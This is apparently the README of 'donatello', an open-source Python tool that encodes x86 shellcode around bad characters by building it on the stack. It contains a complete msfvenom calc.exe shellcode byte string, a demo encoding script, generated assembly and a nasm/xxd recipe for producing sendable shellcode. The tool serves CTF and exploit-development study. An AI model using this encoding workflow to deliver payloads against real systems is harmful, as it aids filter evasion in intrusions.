# donatello

## Synopsis

`donatello` is a Python library and command-line tool for encoding binary payloads by writing them word-by-word to the stack. It's core functionality comes from the [satisfaction of Boolean expressions](https://en.wikipedia.org/wiki/Boolean_satisfiability_problem).


## Installation

Download the latest packaged version from PyPI:
```sh
pip install donatello
```

Or get the bleeding-edge version from version control:
```sh
pip install https://github.com/welchbj/donatello/archive/master.tar.gz
```


## Basic Usage

You can use `donatello` as both a Python library and a command-line tool. When encoding entire payloads, it's best to write a quick Python script and use `donatello` as a library. Here's a simple script to do some basic encoding on a [Metasploit](https://www.metasploit.com/) payload, with every other of its characters specified as a bad character:
```python
"""Simple demo for encoding a metasploit payload with a few bad chars."""

from donatello import encode_x86_32

payload = (
    # msfvenom -p windows/exec cmd="calc.exe" -f c
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    b"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    b"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    b"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
    b"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
    b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    b"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
)

bad_chars = bytearray([payload[i] for i in range(len(payload)) if not i % 2])


if __name__ == '__main__':
    print(encode_x86_32(payload, bad_chars, max_factors=5))
```

Running this script would generate the following assembly program:
```assembly
[BITS 32]
global _start
_start:
;
;
; clear eax
and eax,dword 0x04040404
and eax,dword 0x80808080
;
; build value 0x90909000
xor eax,dword 0x9090907e
and eax,dword 0x90909080
push eax
;
;
; clear eax
and eax,dword 0x04040404
and eax,dword 0x80808080
;
; build value 0x6578652e
xor eax,dword 0x65f865ae
and eax,dword 0x657c656e
push eax

...<snip>...

; clear eax
and eax,dword 0x04040404
and eax,dword 0x80808080
;
; build value 0x0082e8fc
xor eax,dword 0x7ec2e8fe
and eax,dword 0x8092e8fd
push eax
```

When you just need to do a quick factoring of some values for manually-encoded shellcode, the `factor` option in the command-line interface is probably what you're looking for. Here's a quick example that shows how you can quickly find some factors:
```sh
donatello -b "\x12\x34\x56\x78" factor 0x12345678
[I] Attempting to factor target value 0x12345678
[I] Found factorization!
    0x00000000
or  0x5274767c
and 0x92b4d6f8
```


## Assembler recipes

Having the assembly for the encoded payload is nice, but you'll probably want it in a form you can send over the network. To get a C/Python style representation of the `donatello`-generated assembly stored in a file `shellcode.asm`, use:
```sh
nasm shellcode.asm && xxd -p shellcode | sed 's/.\{2\}/\\x&/g' | tr -d '\n'
```


## License

`donatello` is intended for educational purposes and events such as CTFs only and should never be run on machines and/or networks without explicit prior consent. This code is released under the [MIT license](https://opensource.org/licenses/MIT).


## Special Thanks

Many helpful resources were used in the development of this tool, including:

* [MazeGen's x86 reference](http://ref.x86asm.net/coder32.html)
* [NASM](https://www.nasm.us/)
* [Phrack - Writing ia32 alphanumeric shellcodes](http://phrack.org/issues/57/15.html)